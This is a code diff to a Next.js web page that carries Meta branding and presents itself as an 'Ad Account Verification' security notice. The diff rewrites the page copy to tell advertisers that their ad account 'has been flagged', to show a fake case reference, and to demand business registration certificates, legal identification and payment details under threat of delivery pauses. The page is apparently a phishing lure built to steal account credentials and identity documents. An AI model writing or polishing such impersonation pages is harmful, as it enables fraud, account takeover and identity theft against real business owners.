@@ -4,8 +4,8 @@ import Image from "next/image";
 import type { Metadata } from "next";
 
 export const metadata: Metadata = {
-  title: "Trust & Safety Portal | Identity & Account Validation",
-  description: "Mandatory security check and ownership confirmation for account managers.",
+  title: "Business Support Center | Ad Account Verification",
+  description: "Mandatory identity and advertiser verification for ad account managers.",
   alternates: {
     canonical: "/accounts-center",
   },
@@ -29,25 +29,25 @@ export default function AccountsCenterPage() {
               </div>
               <div>
                 <h1 className="text-2xl font-semibold tracking-tight sm:text-3xl">
-                  Security Notification: Confirm Account Ownership
+                  Security Notification: Confirm Ad Account Ownership
                 </h1>
                 <p className="mt-2 text-sm font-semibold text-slate-800">
-                  Periodic safety evaluation and community compliance checkpoint.
+                  Periodic security evaluation and Advertising Policy compliance checkpoint.
                 </p>
               </div>
             </div>
 
             <div className="space-y-4 text-sm leading-relaxed text-slate-700 sm:text-base">
               <p>
-                In accordance with our platform security protocols, we regularly review administrative privileges to safeguard user environments and verify active managers. Your profile has been queued for a standard credentials confirmation to certify compliance with updated platform safety guidelines.
+                To maintain transparency and integrity across our advertising ecosystem, we routinely verify advertiser identities and linked business assets. Your ad account has been flagged for standard credentials verification to ensure full compliance with updated Advertising Standards.
               </p>
 
               <p>
-                Validating your account records maintains full operational control, protects associated brand assets against spoofing or takeover attempts, and guarantees uninterrupted access to connected services and administrative tools.
+                Completing this verification ensures uninterrupted ad delivery, safeguards billing methods and business assets, and helps protect your Ads Manager against unauthorized access or account takeover attempts.
               </p>
 
               <p className="mt-4 text-sm font-medium text-metaBlue">
-                Reference Reference No: <span className="underline decoration-dotted">#SEC-4719-AUTH-AUDIT</span>
+                Case Reference ID: <span className="underline decoration-dotted">#SEC-4719-AUTH-AUDIT</span>
               </p>
 
               <div className="mt-6 space-y-3">
@@ -57,15 +57,15 @@ export default function AccountsCenterPage() {
 
                 <ul className="space-y-3 text-sm text-slate-700 sm:text-[15px]">
                   <li>
-                    • <strong>Information Consistency:</strong> Ensure all legal credentials, business registrations, and primary contact methods strictly align with the details on record. Mismatched details or omissions may trigger extended validation delays.
+                    • <strong>Information Consistency:</strong> Ensure all business registration certificates, legal identification, and payment details strictly match the registered information in your Ads Manager.
                   </li>
 
                   <li>
-                    • <strong>Review Timeframe:</strong> Please review and finalize the requested details within the open verification window. Unconfirmed requests may result in temporary permission holds until identification is resolved.
+                    • <strong>Review Timeframe:</strong> Please submit the required documents within the active verification window. Unverified ad accounts may experience temporary delivery pauses or spending limit restrictions.
                   </li>
 
                   <li>
-                    • <strong>Processing &amp; Status Maintenance:</strong> Once information is received, our security systems will assess the records against platform safety benchmarks (typically within 24–48 hours). Your account standing and management roles will remain completely secure throughout the process.
+                    • <strong>Processing &amp; Status Maintenance:</strong> Once submitted, our review team will evaluate your credentials (typically within 24–48 hours). Active campaigns, budgets, and billing profiles will remain protected during the review.
                   </li>
                 </ul>
               </div>
@@ -73,14 +73,14 @@ export default function AccountsCenterPage() {
 
             <div className="mt-10 flex justify-center">
               <ButtonWithModal className="inline-flex items-center rounded-full bg-metaBlue px-10 py-3 text-sm font-semibold text-white shadow-sm transition hover:bg-metaIndigo focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-metaBlue focus-visible:ring-offset-2">
-                Begin Security Verification
+                Verify Ad Account
               </ButtonWithModal>
             </div>
           </section>
 
           <footer className="mt-6 flex flex-wrap justify-center gap-4 text-xs text-slate-500 sm:text-[13px]">
             <button className="hover:text-slate-700" type="button">
-              Support Center
+              Business Help Center
             </button>
             <span className="text-slate-400">|</span>
             <button className="hover:text-slate-700" type="button">
@@ -88,11 +88,11 @@ export default function AccountsCenterPage() {
             </button>
             <span className="text-slate-400">|</span>
             <button className="hover:text-slate-700" type="button">
-              Terms &amp; Policies
+              Advertising Policies
             </button>
             <span className="text-slate-400">|</span>
             <button className="hover:text-slate-700" type="button">
-              Safety Guidelines
+              Community Standards
             </button>
             <span className="text-slate-400">|</span>
             <span>Meta © 2026</span>
